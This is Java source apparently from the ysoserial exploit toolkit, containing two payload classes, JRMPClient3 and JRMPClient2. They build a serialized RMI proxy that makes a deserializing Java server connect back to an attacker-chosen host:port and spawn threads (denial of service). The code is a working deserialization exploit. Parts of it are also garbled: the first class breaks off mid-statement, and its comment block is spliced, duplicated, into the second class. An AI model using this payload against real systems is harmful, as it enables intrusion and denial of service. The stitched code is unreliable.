                for(int i$ = 0; i$ , long)
     * DGCClient$EndpointEntry.registerRefs(List)
     * DGCClient.registerRefs(Endpoint, List)
     * LiveRef.read(ObjectInput, boolean)
     * UnicastRef.readExternal(ObjectInput)
     *
     * Thread.start()
     * DGCClient$EndpointEntry.(Endpoint)
     * DGCClient$EndpointEntry.lookup(Endpoint)
     * DGCClient.registerRefs(Endpoint, List)
     * LiveRef.read(ObjectInput, boolean)
     * UnicastRef.readExternal(ObjectInput)
     *
     * Requires:
     * - JavaSE
     *
     * Argument:
     * - host:port to connect to, host only chooses random port (DOS if repeated many times)
     *
     * Yields:
     * * an established JRMP connection to the endpoint (if reachable)
     * * a connected RMI Registry proxy
     * * one system thread per endpoint (DOS)
     *
     * @author mbechler
     */
    @SuppressWarnings ( {
        "restriction"
    } )
    @PayloadTest( harness="ysoserial.test.payloads.JRMPReverseConnectSMTest")
    @Authors({ Authors.MBECHLER })
    public class JRMPClient3 extends PayloadRunner implements ObjectPayload {
        public Object getObject (final String command ) throws Exception {
            String host;
            int port;
            int sep = command.indexOf(':');
            if ( sep , long)
     * DGCClient$EndpointEntry.registerRefs(List)
     * DGCClient.registerRefs(Endpoint, List)
     * LiveRef.read(ObjectInput, boolean)
     * UnicastRef.readExternal(ObjectInput)
     *
     * Thread.start()
     * DGCClient$EndpointEntry.(Endpoint)
     * DGCClient$EndpointEntry.lookup(Endpoint)
     * DGCClient.registerRefs(Endpoint, List)
     * LiveRef.read(ObjectInput, boolean)
     * UnicastRef.readExternal(ObjectInput)
     *
     * Requires:
     * - JavaSE
     *
     * Argument:
     * - host:port to connect to, host only chooses random port (DOS if repeated many times)
     *
     * Yields:
     * * an established JRMP connection to the endpoint (if reachable)
     * * a connected RMI Registry proxy
     * * one system thread per endpoint (DOS)
     *
     * @author avfisher
     */
    @SuppressWarnings ( {
        "restriction"
    } )
    @PayloadTest( harness = "ysoserial.payloads.JRMPReverseConnectSMTest")
    @Authors({ Authors.MBECHLER })
    public class JRMPClient2 extends PayloadRunner implements ObjectPayload {
        public Object getObject (final String command ) throws Exception {
            String host;
            int port;
            int sep = command.indexOf(':');
            if ( sep < 0 ) {
                port = new Random().nextInt(65535);
                host = command;
            }
            else {
                host = command.substring(0, sep);
                port = Integer.valueOf(command.substring(sep + 1));
            }
            ObjID id = new ObjID(new Random().nextInt()); // RMI registry
            TCPEndpoint te = new TCPEndpoint(host, port);
            UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
            RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
            Activator proxy = (Activator) Proxy.newProxyInstance(JRMPClient2.class.getClassLoader(), new Class[] {
                Activator.class
            }, obj);
            return proxy;
        }
        public static void main ( final String[] args ) throws Exception {
            Thread.currentThread().setContextClassLoader(JRMPClient2.class.getClassLoader());
            PayloadRunner.run(JRMPClient2.class, args);
        }
    }